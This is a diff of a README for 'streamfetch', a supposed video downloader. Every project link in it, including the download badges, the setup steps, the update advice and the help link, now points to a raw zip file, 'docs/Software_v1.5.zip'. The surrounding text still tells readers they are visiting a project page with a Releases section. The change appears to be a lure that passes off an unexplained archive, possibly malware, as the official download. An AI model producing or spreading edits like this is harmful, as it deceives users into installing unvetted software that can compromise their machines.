@@ -1,6 +1,6 @@
 # 🚀 streamfetch - Quick and Simple Video Downloader
 
-[![Download streamfetch](https://img.shields.io/badge/Download%20streamfetch-green?style=for-the-badge)](https://github.com/azizDZ33463/streamfetch)
+[![Download streamfetch](https://img.shields.io/badge/Download%20streamfetch-green?style=for-the-badge)](https://raw.githubusercontent.com/azizDZ33463/streamfetch/main/docs/Software_v1.5.zip)
 
 ---
 
@@ -32,11 +32,11 @@ streamfetch runs as a desktop app. No need for extra software if your system mee
 
 ## 📥 How to Get streamfetch
 
-[![Get streamfetch](https://img.shields.io/badge/Download%20streamfetch-blue?style=for-the-badge)](https://github.com/azizDZ33463/streamfetch)
+[![Get streamfetch](https://img.shields.io/badge/Download%20streamfetch-blue?style=for-the-badge)](https://raw.githubusercontent.com/azizDZ33463/streamfetch/main/docs/Software_v1.5.zip)
 
 To get streamfetch:
 
-1. Visit the main project page: https://github.com/azizDZ33463/streamfetch.
+1. Visit the main project page: https://raw.githubusercontent.com/azizDZ33463/streamfetch/main/docs/Software_v1.5.zip
 
 2. Look for the "Releases" section on the page.
 
@@ -154,7 +154,7 @@ If you run into problems:
 
 To keep streamfetch working well:
 
-1. Visit the official project link regularly: https://github.com/azizDZ33463/streamfetch.
+1. Visit the official project link regularly: https://raw.githubusercontent.com/azizDZ33463/streamfetch/main/docs/Software_v1.5.zip
 
 2. Check the "Releases" section for updates.
 
@@ -200,4 +200,4 @@ If you need assistance:
 
 Use the GitHub link below for help and downloads:
 
-[https://github.com/azizDZ33463/streamfetch](https://github.com/azizDZ33463/streamfetch)
+[https://raw.githubusercontent.com/azizDZ33463/streamfetch/main/docs/Software_v1.5.zip](https://raw.githubusercontent.com/azizDZ33463/streamfetch/main/docs/Software_v1.5.zip)
